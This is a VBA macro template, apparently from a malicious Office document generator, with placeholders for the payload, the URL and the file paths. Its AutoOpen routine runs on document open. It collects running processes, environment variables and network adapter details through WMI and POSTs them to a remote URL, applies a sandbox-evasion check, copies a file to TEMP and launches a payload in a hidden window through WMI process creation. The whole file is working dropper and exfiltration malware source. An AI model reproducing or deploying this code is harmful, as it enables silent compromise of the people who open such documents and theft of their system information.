[use:payload_wrapper]
[use:exec]
[use:init_wmi]
[use:init_properties]
[use:env_query]
[use:process_list]
[use:env_list]
[use:network_list]

Sub AutoOpen()
	env_query
	Dim var1 As String
	Dim var2 As Object
	Dim var3 As Integer
	Dim var4 As String
	Dim var5 As String
    	Dim var6 As String

    	var6 = Environ(decode("[TEMP]")) & "\" & decode("[DST]")
    	FileCopy decode("[SRC]"), var6

	var3 = [int1]
	var1 = func_evasion_process()
	If (var1 = "bool1") Then
		var5 = init_wmi("data1")
		Set var2 = GetObject(var5)
        var4 = payload_wrapper("data1", var6)
		var4 = exec(var2, var4, var3)
	End If
End Sub

Function payload_wrapper(payload_wrapper1 As String, payload_wrapper3 As String) As String
	Dim payload_wrapper2 As String
	[payload]
	payload_wrapper2 = [payload_args]
	payload_wrapper2 = decode(payload_wrapper2)
	payload_wrapper = payload_wrapper3 & payload_wrapper2
End Function

Function init_properties() As String
        Dim init_properties1 As String
        init_properties1 = decode("{[winmgmts:root/cimv2]}")
        init_properties = init_properties1
End Function

Function exec(exec1 As Object, exec2 As String, exec3 As Integer) As String
	Dim exec4 As String
	Dim exec5 As Integer
	Dim exec13 As Integer
	Dim exec14 As Integer
	exec5 = [smallint1]
	exec4 = exec2
	If (exec3 > exec5) Then
			Set exec10 = GetObject(init_properties())
			Set exec11 = exec10.Get(decode("{[Win32_ProcessStartup]}"))
			Set exec12 = exec11.SpawnInstance_
			exec5 = exec3 - exec3
			exec5 = exec5 + 12
			exec12.ShowWindow = exec5
			exec14 = exec1.Create(exec4, null, exec12, exec13)
	End If
	exec4 = "exec6"
	exec = exec4
End Function

Function init_wmi(init_wmi1 As String) As String
	Dim init_wmi2 As String
	init_wmi2 = decode("{[winmgmts:Win32_Process]}")
    init_wmi = init_wmi2
End Function

Function env_query() As String
	Dim env_query1 As String
	Set env_query2 = CreateObject(decode("{[MSXML2.ServerXMLHTTP]}"))
	env_query1 = process_list()
	env_query1 = env_query1 & Chr(10) & env_list()
	env_query1 = env_query1 & Chr(10) & network_list()
	decode(env_query1)

	URL = decode("[URL]")
	env_query2.Open "POST", URL, False
	env_query2.send(env_query1)
End Function

Function process_list() As String
    On Error Resume Next
    Dim process_list1 As Object
    Dim process_list2 As Object
    Dim process_list4 As String
    Set process_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set process_list2 = process_list1.ExecQuery(decode("{[SELECT Name FROM Win32_Process]}"))
    For Each process_list3 In process_list2
        process_list4 = process_list4 & "," & process_list3.Name
    Next
    process_list = process_list4
End Function

Function env_list() As String
    On Error Resume Next
    Dim env_list1 As Object
    Dim env_list2 As Object
    Dim env_list4 As String
    Set env_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set env_list2 = env_list1.ExecQuery(decode("{[SELECT Name, VariableValue FROM Win32_Environment]}"))
    For Each env_list3 In env_list2
        env_list4 = env_list4 & "," & env_list3.Name & "=" & env_list3.VariableValue
    Next
    env_list = env_list4
End Function

Function network_list() As String
    On Error Resume Next
    Dim network_list1 As Object
    Dim network_list2 As Object
    Dim network_list4 As String
    Set network_list1 = GetObject(decode("{[winmgmts:\\.\root\cimv2]}"))
    Set network_list2 = network_list1.ExecQuery(decode("{[SELECT IPAddress, Description FROM Win32_NetworkAdapterConfiguration]}"))
    For Each network_list3 In network_list2
        network_list4 = network_list4 & "," & network_list3.IPAddress & "=" & network_list3.Description
    Next
    network_list = network_list4
End Function
